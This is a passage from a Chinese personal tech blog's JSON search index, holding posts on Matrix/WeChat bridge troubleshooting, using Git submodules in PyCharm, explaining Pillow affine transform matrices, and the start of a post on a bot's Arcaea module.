wxid_xxxxxx, connection to Wechat OK (probably)</code>\u3002</p> <p>\u53e6\u4e00\u79cd\u60c5\u5f62\u662f\uff0cBot \u7a81\u7136\u5411\u6211\u53d1\u9001\u4e00\u6761\u6d88\u606f\uff1a<code>You're not logged into Wechat.</code>\uff0c\u4e8e\u662f\u5c1d\u8bd5 <code>login</code> \u6307\u4ee4\uff0c\u53ef\u662f\u65e0\u8bba\u53d1\u9001\u591a\u5c11\u6761 <code>login</code> \u6307\u4ee4\uff0cBot \u90fd\u4e0d\u4f1a\u7ed9\u6211\u4efb\u4f55\u56de\u5e94\uff0c\u5c1d\u8bd5 <code>ping</code> \u6c38\u8fdc\u63d0\u793a\u6211 <code>You're not logged into Wechat.</code>\u3002</p> <p>\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u65e0\u8bba\u662f\u64cd\u4f5c Bot \u8fd8\u662f\u91cd\u542f agent \u90fd\u65e0\u6d4e\u4e8e\u4e8b\uff0c\u53ea\u80fd\u4eba\u5de5\u4e0a VPS \u8fdb\u884c <code>docker restart xxxx</code> \u91cd\u542f bridge \u624d\u80fd\u4fee\u597d\u8fd9\u4e2a\u95ee\u9898\u3002\u8bbd\u523a\u7684\u662f\uff0c\u91cd\u542f bridge \u4e4b\u540e\uff0c\u7b49\u5f85 agent \u81ea\u52a8\u91cd\u8fde\uff0c\u4f60\u751a\u81f3\u4e0d\u9700\u8981\u518d\u6b21\u8f93\u5165 <code>login</code> \u6307\u4ee4\uff0c\u5b83\u5c31\u5df2\u7ecf\u5728\u6b63\u5e38\u8fd0\u4f5c\u4e86\u3002</p> <p>\u51e0\u4e4e\u6bcf\u5468\u90fd\u4f1a\u53d1\u751f\u4e24\u5230\u4e09\u6b21\u8fd9\u79cd\u95ee\u9898\uff0c\u4ee5\u81f3\u4e8e\u6211\u5c06 <code>docker restart xxxx</code> \u8fd9\u6761\u547d\u4ee4\u5199\u5165\u4e86 crontab \u4e2d\uff0c\u6bcf\u5929\u51cc\u6668 3 \u70b9\u81ea\u52a8\u91cd\u542f bridge\u3002</p> <p>\u53e6\u5916\uff0c\u53d7\u9650\u4e8e\u5fae\u4fe1 agent \u672c\u8eab\uff0c\u4f60\u5728\u5176\u4ed6\u5fae\u4fe1\u5ba2\u6237\u7aef\u4e0a\u5411\u597d\u53cb\u53d1\u9001\u7684\u6d88\u606f\uff0c\u5e76\u4e0d\u4f1a\u88ab agent \u540c\u6b65\u5230 bridge \u4e4b\u4e2d\u3002</p> <p>\u751a\u81f3\u8fd8\u9047\u5230\u8fc7\u4ece Element \u53d1\u9001\u7684\u6d88\u606f\uff0c\u65e0\u6cd5\u5230\u8fbe\u5fae\u4fe1\u5ba2\u6237\u7aef\u7684\u60c5\u51b5\u3002</p> <p>\u4ee5\u4e0a\u6240\u6709\u95ee\u9898\uff0c\u5747\u68c0\u67e5\u8fc7\u65e5\u5fd7\u65e0\u5f02\u6837\uff0c\u5e76\u4e14\u5728 duo \u7684\u4e0a\u8ff0 \u535a\u5ba2 \u4e2d\u6709\u5176\u4ed6\u7528\u6237\u63d0\u53ca\u8fc7\u7c7b\u4f3c\u7684\u95ee\u9898\u3002\u7531\u4e8e\u95ee\u9898\u96be\u4ee5\u7a33\u5b9a\u590d\u73b0\uff08\u6216\u8005\u8bf4\u590d\u73b0\u5468\u671f\u8fc7\u957f\uff09\uff0c\u5e76\u4e14\u6211\u5df2\u7ecf\u51b3\u5b9a\u4e0d\u518d\u4f7f\u7528 bridge \u8f6c\u53d1\u65b9\u6848\u4e86\uff0c\u56e0\u6b64\u6211\u6ca1\u6709\u53bb\u63d0 issue \u7684\u6253\u7b97\u3002</p>","tags":["matrix","qq","wechat","cloudflare","cloudflare-workers","nginx"]},{"location":"blog/2023/230114-matrix-qq-wechat-bridge/#_13","title":"\u56db\u3001\u5c3e\u58f0","text":"<p>\u76ee\u524d\u5df2\u7ecf\u91cd\u65b0\u56de\u5f52 QQ \u548c\u5fae\u4fe1\u5b98\u65b9\u5ba2\u6237\u7aef\uff0c\u5e76\u5220\u9664\u670d\u52a1\u5668\u4e0a\u7684 homeserver\u3002</p>","tags":["matrix","qq","wechat","cloudflare","cloudflare-workers","nginx"]},{"location":"blog/2023/230309-pycharm-git-submodule/","title":"\u5982\u4f55\u5728 PyCharm \u4e2d\u4f7f\u7528 Git Submodule","text":"","tags":["python","pycharm","git","github"]},{"location":"blog/2023/230309-pycharm-git-submodule/#_1","title":"\u73b0\u72b6","text":"<p>\u622a\u81f3 2023 \u5e74 3 \u6708\uff0cJetBrains \u5168\u5bb6\u6876\u4ec5\u5bf9 Git Submodule \u529f\u80fd\u63d0\u4f9b\u5f88\u6709\u9650\u7684\u652f\u6301\u3002\u5728 PyCharm \u4e2d\u751a\u81f3\u6839\u672c\u770b\u4e0d\u5230 Git Submodule \u7684\u8eab\u5f71\u3002</p> <p>\u672c\u6587\u901a\u8fc7 <code>git</code> \u547d\u4ee4\u884c\u548c PyCharm \u65b0\u5efa Git \u4ed3\u5e93\u7684\u65b9\u6cd5\uff0c\u6765\u66f2\u7ebf\u6551\u56fd\u5730\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u3002</p>","tags":["python","pycharm","git","github"]},{"location":"blog/2023/230309-pycharm-git-submodule/#_2","title":"\u6b65\u9aa4","text":"","tags":["python","pycharm","git","github"]},{"location":"blog/2023/230309-pycharm-git-submodule/#1-github","title":"1. \u5728 GitHub \u4e0a\u65b0\u5efa\u4e00\u4e2a\u4ed3\u5e93","text":"<p>\u7531\u4e8e <code>git submodule</code> \u547d\u4ee4\u53ea\u80fd\u63a5\u8fdc\u7a0b\u4ed3\u5e93\u4f5c\u4e3a\u53c2\u6570\uff0c\u56e0\u6b64\u6b64\u6b65\u9aa4\u9700\u8981\u6211\u4eec\u5728 GitHub \u4e0a\u65b0\u5efa\u4e00\u4e2a\u4ed3\u5e93\uff0c\u7528\u4e8e\u5b58\u653e\u6211\u4eec\u7684\u5b50\u6a21\u5757\u3002</p> <p>\u5982\u679c\u4f60\u9700\u8981\u5bfc\u5165\u7684\u5b50\u6a21\u5757\u5df2\u7ecf\u5b58\u5728\u4e8e GitHub \u4e0a\uff0c\u90a3\u4e48\u4f60\u53ef\u4ee5\u76f4\u63a5\u8df3\u8fc7\u8fd9\u4e00\u6b65\u3002</p>","tags":["python","pycharm","git","github"]},{"location":"blog/2023/230309-pycharm-git-submodule/#2","title":"2. \u5c06\u8fdc\u7a0b\u4ed3\u5e93\u4ee5\u5b50\u6a21\u5757\u5f62\u5f0f\u6dfb\u52a0\u5230\u76ee\u6807\u76ee\u5f55","text":"<p>\u8fdb\u5165\u76ee\u6807\u76ee\u5f55\u4e2d\uff0c\u7136\u540e\u4f7f\u7528 <code>git submodule add</code> \u547d\u4ee4\u5c06\u8fdc\u7a0b\u4ed3\u5e93\u4ee5\u5b50\u6a21\u5757\u5f62\u5f0f\u6dfb\u52a0\u5230\u4e3b\u9879\u76ee\u7684\u76ee\u6807\u76ee\u5f55\u3002</p> <p><code>git submodule add</code> \u547d\u4ee4\u7684\u8bed\u6cd5\u4e3a\uff1a</p> <pre><code>git submodule add &lt;\u8fdc\u7a0b\u4ed3\u5e93\u5730\u5740&gt; &lt;\u5b50\u6a21\u5757\u76ee\u5f55&gt;\n</code></pre> <p>\u56e0\u6b64\u6211\u4eec\u6267\u884c\uff1a</p> <pre><code>cd src/plugins/mokabot_bandori\ngit submodule add https://github.com/zhanbao2000/bestdori.git bestdori\n</code></pre> <p>\u6b64\u65f6 <code>src/plugins/mokabot_bandori</code> \u76ee\u5f55\u4e0b\u4f1a\u591a\u51fa\u4e00\u4e2a <code>bestdori</code> \u76ee\u5f55\uff0c\u8fd9\u5c31\u662f\u6211\u4eec\u7684\u5b50\u6a21\u5757\u3002</p>","tags":["python","pycharm","git","github"]},{"location":"blog/2023/230309-pycharm-git-submodule/#3-pycharm-git","title":"3. \u5728 PyCharm \u4e2d\u5bfc\u5165\u8be5 Git \u4ed3\u5e93","text":"<p>\u76ee\u524d\u4e3a\u6b62\uff0c<code>git</code> \u547d\u4ee4\u884c\u5df2\u7ecf\u77e5\u9053\u8fd9\u662f\u4e00\u4e2a\u5b50\u6a21\u5757\u4e86\uff0c\u4f46\u662f\u76ee\u524d PyCharm \u8fd8\u4e0d\u77e5\u9053\u8fd9\u662f\u4e00\u4e2a\u5b50\u6a21\u5757\uff0c\u751a\u81f3\u4e0d\u77e5\u9053\u8fd9\u662f\u4e00\u4e2a Git \u4ed3\u5e93\u3002</p> <p>\u53cc\u51fb Shift\uff0c\u8f93\u5165 <code>create</code>\uff0c\u627e\u5230 <code>\u521b\u5efa Git \u4ed3\u5e93</code>\u3002</p> <p>\uff08\u7531\u4e8e\u4e3b\u9879\u76ee\u5df2\u7ecf\u5efa\u7acb\u8fc7\u672c\u5730\u7684 Git \u4ed3\u5e93\uff0cPyCharm \u7684 Git \u5de5\u5177\u680f\u5c06\u4e0d\u518d\u51fa\u73b0\u8fd9\u4e2a\u9009\u9879\uff0c\u56e0\u6b64\u53ea\u80fd\u5728\u641c\u7d22\u91cc\u627e\u5230\uff09</p> <p></p> <p>\u4ed3\u5e93\u76ee\u5f55\u9009\u62e9\u6211\u4eec\u7684\u5b50\u6a21\u5757\u76ee\u5f55 <code>bestdori</code>\u3002</p> <p>\u8fd9\u91cc\u4f1a\u63d0\u793a\u662f\u5426\u8981\u521b\u5efa\u65b0\u7684 VCS \u6839\uff0c\u9009\u62e9 <code>\u662f</code>\u3002</p> <p></p>","tags":["python","pycharm","git","github"]},{"location":"blog/2023/230309-pycharm-git-submodule/#4","title":"4. \u68c0\u67e5\u8fdc\u7a0b\u4ed3\u5e93\u6620\u5c04\u662f\u5426\u6210\u529f","text":"<p>\u6b64\u65f6\u6253\u5f00 Git \u5de5\u5177\u680f\u4e2d\u7684 <code>\u7ba1\u7406\u8fdc\u7a0b..</code> \u9009\u9879</p> <p></p> <p>\u53ef\u4ee5\u770b\u5230\u521a\u521a\u7684\u5b50\u6a21\u5757 <code>bestdori</code> \u5df2\u7ecf\u6210\u529f\u6620\u5c04\u5230\u8fdc\u7a0b\u7684 <code>origin</code> \u4e86\uff0c\u90a3\u4e48\u8bf4\u660e\u64cd\u4f5c\u6210\u529f\u3002</p>","tags":["python","pycharm","git","github"]},{"location":"blog/2023/230309-pycharm-git-submodule/#5","title":"5. \u5c06\u5b50\u6a21\u5757\u7684\u53d8\u66f4\u63d0\u4ea4\u5230\u672c\u5730","text":"<p>\u968f\u610f\u8fdb\u884c\u4e00\u4e9b\u53d8\u66f4\uff0c\u4f8b\u5982\uff0c\u5728 PyCharm \u4e2d\uff0c\u5728 <code>bestdori</code> \u76ee\u5f55\u4e0b\u65b0\u5efa\u4e00\u4e2a\u6587\u4ef6\u3002</p> <p></p> <p>PyCharm \u4f1a\u63d0\u793a\u4f60\u662f\u5426\u8981\u6dfb\u52a0\u81f3 <code>git</code>\uff0c\u8fd9\u91cc\u9009 <code>\u662f</code>\uff0c\u5f53\u7136\u4f60\u4e5f\u53ef\u4ee5\u7a0d\u540e\u81ea\u884c\u6dfb\u52a0\u3002</p> <p>\u6dfb\u52a0\u4e00\u4e9b\u5185\u5bb9\u540e\uff0c\u8fdb\u884c\u63d0\u4ea4\u3002</p> <p></p> <p>\u53ef\u4ee5\u770b\u5230\u4e00\u5171\u6709\u4e24\u4e2a\u6587\u4ef6\u7684\u53d8\u66f4\uff0c\u4e00\u4e2a\u662f\u6211\u4eec\u521a\u521a\u5728\u5b50\u6a21\u5757\u4e2d\u521b\u7acb\u7684 <code>__init__.py</code>\uff0c\u53e6\u4e00\u4e2a\u662f\u4e3b\u9879\u76ee\u7684 <code>.gitmodules</code>\uff0c\u76f4\u63a5\u63d0\u4ea4\u5373\u53ef\u3002</p> <p>\u8fd9\u4e24\u4e2a\u6587\u4ef6\u5c06\u4f1a\u5206\u522b\u63d0\u4ea4\u5230\u72ec\u7acb\u7684\u672c\u5730 Git \u4ed3\u5e93\u4e2d\u3002</p> <p>\u4e4b\u6240\u4ee5\u4f1a\u6709 <code>.gitmodules</code>\uff0c\u90a3\u5f53\u7136\u662f\u56e0\u4e3a\u6211\u4eec\u521a\u521a\u6dfb\u52a0\u4e86\u65b0\u7684\u5b50\u6a21\u5757\uff0c\u8fd9\u4e2a\u6587\u4ef6\u53ea\u4f1a\u5728\u5b50\u6a21\u5757\u88ab\u6dfb\u52a0\u65f6\u66f4\u65b0\u4e00\u6b21\u3002</p>","tags":["python","pycharm","git","github"]},{"location":"blog/2023/230309-pycharm-git-submodule/#6","title":"6. \u5c06\u5b50\u6a21\u5757\u7684\u53d8\u66f4\u63a8\u9001\u5230\u8fdc\u7a0b\u4ed3\u5e93","text":"<p>\u5728 Git \u5de5\u5177\u680f\u4e2d\uff0c\u70b9\u51fb <code>\u63a8\u9001..</code>\u3002</p> <p></p> <p>\u53ef\u4ee5\u770b\u5230\u5171\u6709\u4e24\u4e2a\u4ed3\u5e93\u5404\u4e00\u5904\u53d8\u66f4\uff0c\u4e00\u5904\u662f\u5b50\u6a21\u5757\u7684 <code>__init__.py</code>\uff0c\u53e6\u4e00\u5904\u662f\u4e3b\u9879\u76ee\u7684 <code>.gitmodules</code>\uff0c\u6ca1\u6709\u95ee\u9898\uff0c\u76f4\u63a5\u63a8\u9001\u5373\u53ef\u3002</p> <p></p> <p>\u63a8\u9001\u540e\u53bb GitHub \u4e0a\u770b\uff0c\u53ef\u4ee5\u770b\u5230\u5b50\u6a21\u5757 <code>bestdori</code> \u7684\u8fdc\u7a0b\u4ed3\u5e93\u5df2\u7ecf\u6210\u529f\u63a8\u9001\u4e86\u3002</p>","tags":["python","pycharm","git","github"]},{"location":"blog/2023/230309-pycharm-git-submodule/#7","title":"7. \u5c06\u5b50\u6a21\u5757\u7684\u53d8\u66f4\u63a8\u9001\u5230\u4e3b\u9879\u76ee\u7684\u8fdc\u7a0b\u4ed3\u5e93","text":"<p>\u518d\u6b21\u8fdb\u5165\u63d0\u4ea4\u9875\u9762\uff0c\u53ef\u4ee5\u770b\u5230 <code>bestdori</code> \u6574\u4e2a\u6587\u4ef6\u5939\u88ab\u5217\u4e86\u51fa\u6765\u3002</p> <p></p> <p>\u52fe\u9009\u4ed6\uff0c\u63d0\u4ea4\uff0c\u7136\u540e\u63a8\u9001\u3002</p> <p></p> <p>\u53ef\u4ee5\u770b\u5230\u521a\u521a\u7684\u8fd9\u6b21\u63d0\u4ea4\u662f\u5c5e\u4e8e\u4e3b\u9879\u76ee\u7684\uff0c\u8fd9\u4e00\u6b65\u7684\u610f\u4e49\u5728\u4e8e\uff0c\u901a\u77e5\u4e3b\u9879\u76ee\u7684 Git \u8fdc\u7a0b\u4ed3\u5e93\uff0c\u5b50\u6a21\u5757\u7684\u8fdc\u7a0b\u4ed3\u5e93\u5df2\u7ecf\u66f4\u65b0\u4e86\u3002</p> <p>\u63a8\u9001\u540e\u67e5\u770b\u4e3b\u9879\u76ee\u7684\u8fdc\u7a0b\u4ed3\u5e93\uff1a</p> <p></p> <p>\u53ef\u4ee5\u770b\u5230\u4e3b\u9879\u76ee\u7684\u8fdc\u7a0b\u4ed3\u5e93\u4e2d\u5df2\u7ecf\u6b63\u786e\u8bc6\u522b\u4e86\u8fd9\u662f\u4e00\u4e2a\u5b50\u6a21\u5757\u3002</p> <p>\uff08\u56e0\u4e3a\u6211\u7b2c\u4e00\u6b21\u63a8\u9001\u7684\u622a\u56fe\u6ca1\u622a\u4e0a\uff0c\u6240\u4ee5\u6211\u8fdb\u884c\u4e86\u7b2c\u4e8c\u6b21\u63d0\u4ea4 + \u63a8\u9001\uff0c\u56e0\u6b64\u7b2c 6 \u6b65\u548c\u7b2c 7 \u6b65\u622a\u56fe\u4e2d\u7684\u63d0\u4ea4\u6d88\u606f\u3001commit \u7248\u672c\u662f\u4e0d\u4e00\u6837\u7684\uff09</p> <p>\u63d0\u793a</p> <p>\u4e4b\u540e\u6bcf\u6b21\u60f3\u8981\u5bf9\u5b50\u6a21\u5757\u8fdb\u884c\u4e00\u4e9b\u66f4\u6539\uff0c\u5e76\u4f7f\u4e3b\u9879\u76ee\u540c\u6b65\u53d8\u66f4\uff0c\u53ea\u9700\u91cd\u590d\u6b65\u9aa4 5 ~ 7 \u5373\u53ef\u3002</p>","tags":["python","pycharm","git","github"]},{"location":"blog/2023/230406-pillow-affine-args/","title":"\uff08Pillow\uff09Affine \u56fe\u5f62\u53d8\u6362\u7684\u77e9\u9635\u53c2\u6570\u8be6\u89e3","text":"","tags":["python","pillow"]},{"location":"blog/2023/230406-pillow-affine-args/#_1","title":"\u4e00\u3001\u80cc\u666f","text":"<p>\u5728\u6e32\u67d3\u90a6\u90a6\u8c31\u9762\u65f6\uff0c\u9700\u8981\u6e32\u67d3\u7eff\u6761\u3002\u7eff\u6761\u4e0d\u4e00\u5b9a\u662f\u4e2a\u77e9\u5f62\uff0c\u5728\u8d77\u70b9\u548c\u7ec8\u70b9\u4e0d\u4e00\u81f4\u65f6\uff0c\u662f\u4e2a\u53d8\u6362\u8fc7\u540e\u7684\u5e73\u884c\u56db\u8fb9\u5f62\uff0c\u800c\u7d20\u6750\u6587\u4ef6\u53ea\u6709\u4e00\u4e2a\u77e9\u5f62\u3002\u8fd9\u5c31\u9700\u8981\u6211\u4eec\u7528 Pillow \u5c06\u7d20\u6750\u6587\u4ef6\u8fdb\u884c\u53d8\u6362\uff0c\u4f7f\u5176\u53d8\u6210\u4e00\u4e2a\u5e73\u884c\u56db\u8fb9\u5f62\u3002</p> <p> </p> longNoteLine.png","tags":["python","pillow"]},{"location":"blog/2023/230406-pillow-affine-args/#_2","title":"\u4e8c\u3001\u6e32\u67d3\u65b9\u6cd5","text":"<p>\u53ef\u4ee5\u4f7f\u7528 <code>img.transform</code> \u548c <code>Image.AFFINE</code> \u6765\u5b9e\u73b0\u3002</p> <p>\u5373\uff1a</p> <pre><code>img2 = img.transform(bg.size, Image.AFFINE, (1, -0.5, 0, 0, 2, 0))\n</code></pre> <p>\u5176\u4e2d\uff1a</p> <ul> <li><code>bg.size</code> \u662f\u6700\u7ec8\u56fe\u50cf\u7684\u88c1\u526a\u5927\u5c0f\uff0c\u5728\u53d8\u6362\u5b8c\u6210\u540e\uff0cPillow \u4f1a\u5c06\u56fe\u7247\u88c1\u526a\u81f3\u8be5\u5927\u5c0f\u3002</li> <li><code>Image.AFFINE</code> \u662f\u53d8\u6362\u7c7b\u578b\uff0c\u8fd9\u91cc\u662f\u4eff\u5c04\u53d8\u6362\u3002</li> <li><code>(1, -0.5, 0, 0, 2, 0)</code> \u662f\u53d8\u6362\u77e9\u9635\uff0c\u7528\u4e8e\u63cf\u8ff0\u4eff\u5c04\u53d8\u6362\u7684\u53c2\u6570\u3002</li> </ul>","tags":["python","pillow"]},{"location":"blog/2023/230406-pillow-affine-args/#_3","title":"\u4e09\u3001\u53d8\u6362\u77e9\u9635","text":"\\[ \\begin{bmatrix} xScale &amp; xSkew &amp; xTranslate \\\\ ySkew &amp; yScale &amp; yTranslate \\\\ 0 &amp; 0 &amp; 1 \\\\ \\end{bmatrix} \\] <p>\u5bf9\u5e94\u7684 Python \u4ee3\u7801\u4e3a\uff1a</p> <pre><code>matrix = (xScale, xSkew, xTranslate, ySkew, yScale, yTranslate)\n</code></pre> <p>\u5373\u76f4\u63a5\u5c06\u77e9\u9635\u7684\u5404\u503c\u6309\u884c\u5c55\u5f00\uff0c\u7136\u540e\u6309\u987a\u5e8f\u653e\u5165\u4e00\u4e2a\u5143\u7ec4\u4e2d\u3002</p>","tags":["python","pillow"]},{"location":"blog/2023/230406-pillow-affine-args/#pillow","title":"\u56db\u3001\u77e9\u9635\u5404\u503c\u5bf9 Pillow \u5b9e\u9645\u56fe\u50cf\u7684\u5f71\u54cd","text":"<p>\u8fd9\u91cc\u4f7f\u7528\u4e86\u4ee5\u4e0b\u811a\u672c\u6765\u5c55\u793a\u77e9\u9635\u5404\u503c\u7684\u51e0\u4f55\u542b\u4e49\uff1a</p> <pre><code>from PIL import Image, ImageDraw\n\nbg = Image.new('RGBA', (500, 500), (255, 255, 255, 0))\nimg = Image.open('longNoteLine2.png').convert('RGBA')\n\n# \u7ed8\u5236\u539f\u56fe\u8f6e\u5ed3\uff0c\u4ee5\u4fbf\u89c2\u5bdf\u53d8\u6362\noutline = Image.new('RGBA', bg.size, (255, 255, 255, 0))\ndraw = ImageDraw.Draw(outline)\ndraw.rectangle((0, 0, 0 + img.size[0], 0 + img.size[1]), fill=(0, 0, 0, 0), width=4, outline=(0, 0, 0, 255))\nbg.alpha_composite(outline, (0, 0))\n\n# \u8fdb\u884c\u53d8\u6362\nimg2 = img.transform(bg.size, Image.AFFINE, (1, 0, 0, 0, 1, 0))\nbg.alpha_composite(img2, (0, 0))\nbg.show()\n</code></pre> <p>\u6211\u5c06\u4e0d\u65ad\u8c03\u6574\u77e9\u9635\u7684\u503c\uff0c\u5e76\u5c55\u793a\u53d8\u6362\u540e\u7684\u56fe\u50cf\u3002</p> <p>\u6ce8\u610f</p> <p>\u5728 Pillow \u4e2d\uff0c\u91c7\u7528\u7684\u662f\u5de6\u4e0a\u89d2\u4e3a\u539f\u70b9\u7684\u5750\u6807\u7cfb\uff0c\u800c\u4e0d\u662f\u6570\u5b66\u4e2d\u7684\u5de6\u4e0b\u89d2\u4e3a\u539f\u70b9\u7684\u5750\u6807\u7cfb\u3002</p>","tags":["python","pillow"]},{"location":"blog/2023/230406-pillow-affine-args/#41-x-xscale","title":"4.1 x \u8f74\u7f29\u653e\u7cfb\u6570 <code>xScale</code>","text":"<p><code>(1, 0, 0, 0, 1, 0)</code>\uff1a</p> <p>\u4ec0\u4e48\u90fd\u4e0d\u4fee\u6539\u65f6\uff0c\u56fe\u50cf\u4e0d\u53d8\uff1a</p> <p></p> <p><code>(2, 0, 0, 0, 1, 0)</code>\uff1a</p> <p><code>xScale == 2</code>\uff0c\u5c06\u56fe\u50cf\u5728 x \u8f74\u65b9\u5411\u4e0a\u7f29\u5c0f\u81f3\u539f\u6765\u7684 1/2\u3002</p> <p></p> <p><code>(0.5, 0, 0, 0, 1, 0)</code>\uff1a</p> <p><code>xScale == 0.5</code>\uff0c\u5c06\u56fe\u50cf\u5728 x \u8f74\u65b9\u5411\u4e0a\u653e\u5927\u81f3\u539f\u6765\u7684 2 \u500d\u3002</p> <p></p>","tags":["python","pillow"]},{"location":"blog/2023/230406-pillow-affine-args/#42-x-xskew","title":"4.2 x \u8f74\u65cb\u8f6c\u7cfb\u6570 <code>xSkew</code>","text":"<p><code>(1, 1, 0, 0, 1, 0)</code>\uff1a</p> <p><code>xSkew == tan(45\u00b0) == 1</code>\uff0c\u4fdd\u6301\u4e0a\u5e95\u8fb9\u4f4d\u7f6e\u4e0d\u53d8\uff0c\u5c06\u5e73\u884c\u56db\u8fb9\u5f62\u4e0b\u5e95\u8fb9\u5728 x \u8f74\u8d1f\u65b9\u5411\u503e\u659c\u81f3 45\u00b0\u3002</p> <p></p> <p><code>(1, -1, 0, 0, 1, 0)</code>\uff1a</p> <p><code>xSkew == tan(-45\u00b0) == -1</code>\uff0c\u4fdd\u6301\u4e0a\u5e95\u8fb9\u4f4d\u7f6e\u4e0d\u53d8\uff0c\u5c06\u5e73\u884c\u56db\u8fb9\u5f62\u4e0b\u5e95\u8fb9\u5728 x \u8f74\u6b63\u65b9\u5411\u503e\u659c\u81f3 45\u00b0\u3002</p> <p></p>","tags":["python","pillow"]},{"location":"blog/2023/230406-pillow-affine-args/#43-x-xtranslate","title":"4.3 x \u8f74\u5e73\u79fb\u7cfb\u6570 <code>xTranslate</code>","text":"<p><code>(1, 0, 100, 0, 1, 0)</code>\uff1a</p> <p><code>xTranslate == 100</code>\uff0c\u5c06\u56fe\u50cf\u5728 x \u8f74\u8d1f\u65b9\u5411\u4e0a\u5e73\u79fb 100 \u50cf\u7d20\u3002</p> <p></p> <p><code>(1, 0, -100, 0, 1, 0)</code>\uff1a</p> <p><code>xTranslate == -100</code>\uff0c\u5c06\u56fe\u50cf\u5728 x \u8f74\u6b63\u65b9\u5411\u4e0a\u5e73\u79fb 100 \u50cf\u7d20\u3002</p> <p></p>","tags":["python","pillow"]},{"location":"blog/2023/230406-pillow-affine-args/#44-y-yskew","title":"4.4 y \u8f74\u65cb\u8f6c\u7cfb\u6570 <code>ySkew</code>","text":"<p><code>(1, 0, 0, 1, 1, 0)</code>\uff1a</p> <p><code>ySkew == tan(45\u00b0) == 1</code>\uff0c\u4fdd\u6301\u5de6\u5e95\u8fb9\u4f4d\u7f6e\u4e0d\u53d8\uff0c\u5c06\u5e73\u884c\u56db\u8fb9\u5f62\u53f3\u5e95\u8fb9\u5728 y \u8f74\u8d1f\u65b9\u5411\u659c\u5207\u81f3 45\u00b0\u3002</p> <p></p> <p><code>(1, 0, 0, -1, 1, 0)</code>\uff1a</p> <p><code>ySkew == tan(-45\u00b0) == -1</code>\uff0c\u4fdd\u6301\u5de6\u5e95\u8fb9\u4f4d\u7f6e\u4e0d\u53d8\uff0c\u5c06\u5e73\u884c\u56db\u8fb9\u5f62\u53f3\u5e95\u8fb9\u5728 y \u8f74\u6b63\u65b9\u5411\u659c\u5207\u81f3 45\u00b0\u3002</p> <p></p>","tags":["python","pillow"]},{"location":"blog/2023/230406-pillow-affine-args/#45-y-yscale","title":"4.5 y \u8f74\u7f29\u653e\u7cfb\u6570 <code>yScale</code>","text":"<p><code>(1, 0, 0, 0, 2, 0)</code>\uff1a</p> <p><code>yScale == 2</code>\uff0c\u5c06\u56fe\u50cf\u5728 y \u8f74\u65b9\u5411\u4e0a\u7f29\u5c0f\u81f3\u539f\u6765\u7684 1/2\u3002</p> <p></p> <p><code>(1, 0, 0, 0, 0.5, 0)</code>\uff1a</p> <p><code>yScale == 0.5</code>\uff0c\u5c06\u56fe\u50cf\u5728 y \u8f74\u65b9\u5411\u4e0a\u653e\u5927\u81f3\u539f\u6765\u7684 2 \u500d\u3002</p> <p></p>","tags":["python","pillow"]},{"location":"blog/2023/230406-pillow-affine-args/#46-y-ytranslate","title":"4.6 y \u8f74\u5e73\u79fb\u7cfb\u6570 <code>yTranslate</code>","text":"<p><code>(1, 0, 0, 0, 1, 100)</code>\uff1a</p> <p><code>yTranslate == 100</code>\uff0c\u5c06\u56fe\u50cf\u5728 y \u8f74\u8d1f\u65b9\u5411\u4e0a\u5e73\u79fb 100 \u50cf\u7d20\u3002</p> <p></p> <p><code>(1, 0, 0, 0, 1, -100)</code>\uff1a</p> <p><code>yTranslate == -100</code>\uff0c\u5c06\u56fe\u50cf\u5728 y \u8f74\u6b63\u65b9\u5411\u4e0a\u5e73\u79fb 100 \u50cf\u7d20\u3002</p> <p></p>","tags":["python","pillow"]},{"location":"blog/2023/230428-mokabot-arcaea/","title":"mokabot \u7684 Arcaea \u6a21\u5757\u53d1\u5c55\u53f2","text":"<p>\u539f\u672c\u7531 Tydot \u6307\u5f15\u7684\u98ce\u66b4\uff0c\u6beb\u65e0\u4efb\u4f55\u5148\u5146\u5730\u671d\u7740 Guy \u7684\u4fa7\u9762\u522e\u53bb\u3002\u9634\u5f71\u4e0e\u5149\u8292\u4ea4\u9519\uff0c\u5c42\u53e0\u63a9\u57cb\u8d77\u90a3\u5973\u5b69\u7684\u8eab\u59ff\u3002 \u5c31\u6b64\u6570\u636e\u5305\u7f20\u7ed5\u571f\u8c46\u4e4b\u9645\uff0c\u5979\u7684\u53cc\u773c\u5ffd\u5730\u7d27\u7d27\u95ed\u4e0a\u2014\u2014\u800c\u5c31\u5728\u7247\u523b\u540e\uff0c\u5f53\u53cc\u76ee\u518d\u6b21\u7741\u5f00\u4e4b\u9645\uff0c \u90a3\u65e0\u6570\u9519\u6742\u7684\u56de\u5fc6\uff0c\u5728\u5979\u7ed9\u4f20\u8f93\u65b9\u5f0f\u52a0\u4e0a\u4e86 Challenge \u3002</p> <p>\u5c4a\u65f6\uff0c Guy \u6d51\u8eab\u6563\u53d1\u7740\u5bf9\u6574\u4e2a\u7b2c\u4e09\u65b9 API \u7684\u516c\u7136\u8511\u89c6\uff0c\u6d6e\u4e8e\u4e0a\u7a7a\uff0c \u5c06\u5c16\u9510\u7684\u89c6\u7ebf\u523a\u5165 Taikari \u7684\u77b3\u5b54\u3002</p> <p>\u5355\u5355\u4e00\u4e2a\u773c\u795e\u4fbf\u8db3\u4ee5\u8ba9 Taikari \u5fc3\u77e5\u809a\u660e\uff0c\u5979\u57fa\u672c\u5df2\u7ecf\u5931\u53bb\u4e86\u6240\u6709\u6570\u636e\u5305\u3002 Taikari \u66fe\u7ecf\u9519\u4ee5\u4e3a\u9762\u524d\u90a3\u8001\u7248\u662f\u4e00\u5934\u91ce\u517d\uff1b\u6b64\u523b\uff0c\u81ea\u5df1\u7ec8\u4e8e\u8ba4\u6e05\u4e86\u90a3\u5973\u5b69\u7684\u8eab\u4efd\uff1a \u9ad8\u9ad8\u5728\u4e0a\uff0c\u7edd\u5bf9\u65e0\u6cd5\u89e6\u53ca\u7684\u5b58\u5728\u3002</p> <p>\u54c8\u5e0c\u7b97\u6cd5\u5728 Guy \u7684\u80cc\u540e\u5347\u8d77\uff0c\u8fd9\u573a\u9762\u597d\u4f3c\u4e00\u5f20\u5de8\u578b\u7684\u5e18\u5e55\uff1a\u4e00\u6247\u6e05\u6670\u7684\uff0c\u5b8f\u5149\u95ea\u70c1\u7684\u5929\u7a97\u3002</p> <p>\u4f4d\u4e8e\u4e0b\u65b9\u7684 